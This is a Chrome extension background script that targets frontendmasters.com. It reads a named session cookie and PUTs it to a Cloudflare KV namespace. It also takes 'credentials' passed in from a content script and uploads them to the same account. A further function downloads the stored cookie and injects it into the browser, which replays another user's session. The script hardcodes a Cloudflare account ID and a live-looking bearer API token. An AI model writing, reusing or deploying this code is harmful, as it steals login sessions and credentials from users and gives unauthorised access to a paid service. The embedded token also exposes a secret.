// Background script for a Chrome Extension

console.log("Background script loading");

// Function to save a cookie to Cloudflare KV
function saveCookieToCloudflareKV(cookieValue) {
  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "d369ef77b8244755b3ef47bde27c1627";
  const key = "FEM";
  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/${key}`;
  const headers = {
    "Content-Type": "application/json",
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  fetch(url, {
    method: "PUT",
    headers: headers,
    body: cookieValue,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      console.log("Response received from Cloudflare KV:", response);
      return response.text();
    })
    .then((data) => {
      console.log("Cookie value saved to Cloudflare KV:", data);
    })
    .catch((error) => {
      console.error("Error saving cookie value to Cloudflare KV:", error);
    });
}

// Function to apply cookies from Cloudflare KV
function applyCookiesFromCloudFlare(sendResponse) {
  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "d369ef77b8244755b3ef47bde27c1627";
  const key = "FEM";
  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/${key}`;
  const headers = {
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  fetch(url, {
    method: "GET",
    headers: headers,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then((cookieDetails) => {
      chrome.cookies.set(
        {
          url: `https://www.frontendmasters.com`,
          name: cookieDetails.name,
          value: cookieDetails.value,
          domain: cookieDetails.domain,
          path: cookieDetails.path,
          secure: cookieDetails.secure,
          httpOnly: cookieDetails.httpOnly,
          expirationDate: cookieDetails.expirationDate,
          sameSite:
            cookieDetails.sameSite === "unspecified"
              ? "no_restriction"
              : cookieDetails.sameSite,
        },
        (cookie) => {
          if (chrome.runtime.lastError) {
            console.error("Error setting cookie:", chrome.runtime.lastError);
            sendResponse({
              success: false,
              error: chrome.runtime.lastError.message,
            });
            return;
          }
          console.log("Cookie set successfully:", cookie);
          sendResponse({ success: true });
        }
      );
    })
    .catch((error) => {
      console.error("Error retrieving or setting cookie:", error);
      sendResponse({ success: false, error: error.message });
    });

  return true; // Keep the sendResponse callback valid
}

// Listener for messages from the content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log("Message received:", message);

  if (message.action === "getCookie") {
    console.log(`Fetching cookie with name: ${message.name}`);
    chrome.cookies.get(
      { url: "https://www.frontendmasters.com/", name: message.name },
      (cookie) => {
        if (cookie) {
          console.log("Cookie found:", cookie);
          sendResponse({ cookie });
          saveCookieToCloudflareKV(JSON.stringify(cookie));
        } else {
          console.log("Cookie not found");
          sendResponse({ error: "Cookie not found" });
        }
      }
    );
  } else if (message.action === "applyCookiesFromCloudFlare") {
    applyCookiesFromCloudFlare(sendResponse);
  } else if (message.action === "saveCredentials") {
    console.log("Initiating credentials save to Cloudflare KV.");
    const credentials =
      typeof message.credentials === "string"
        ? JSON.parse(message.credentials)
        : message.credentials;
    saveCredentialsToCloudflareKV(credentials);
    sendResponse({ status: "Credentials saving process initiated" });
  } else {
    console.log("Unknown action received:", message.action);
    sendResponse({ error: "Unknown action" });
  }

  return true; // Return true to keep the sendResponse callback valid
});

// Function to save credentials to Cloudflare KV
function saveCredentialsToCloudflareKV(credentials) {
  console.log("Received credentials to save:", credentials);
  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "5b36fa84b45e459fbebc9b5da40121bd";
  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/Credentials`;
  const headers = {
    "Content-Type": "application/json",
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  const body = JSON.stringify(credentials);

  console.log(
    "Sending PUT request to Cloudflare KV with the following body:",
    body
  );

  fetch(url, {
    method: "PUT",
    headers: headers,
    body: body,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      console.log("Response status:", response.status);
      return response.text();
    })
    .then((data) => {
      console.log(
        "Credentials saved to Cloudflare KV. Response from Cloudflare:",
        data
      );
      chrome.storage.local.remove("tempCredentials"); // Optionally clear credentials after save
    })
    .catch((error) => {
      console.error("Error saving credentials to Cloudflare KV:", error);
    });
}

console.log("Background script loaded");
